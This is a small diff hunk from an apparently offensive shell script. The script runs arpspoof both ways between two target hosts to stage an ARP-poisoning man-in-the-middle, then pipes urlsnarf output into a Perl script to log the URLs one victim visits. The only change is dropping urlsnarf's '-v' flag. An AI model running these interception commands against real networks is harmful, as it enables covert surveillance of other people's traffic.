@@ -10,4 +10,4 @@ fi
 arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
 arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
 # 将urlsnarf的输出交由fmt.pl脚本处理
-urlsnarf -i $1 -v "." "host $2" | perl fmt.pl;
+urlsnarf -i $1 "." "host $2" | perl fmt.pl;
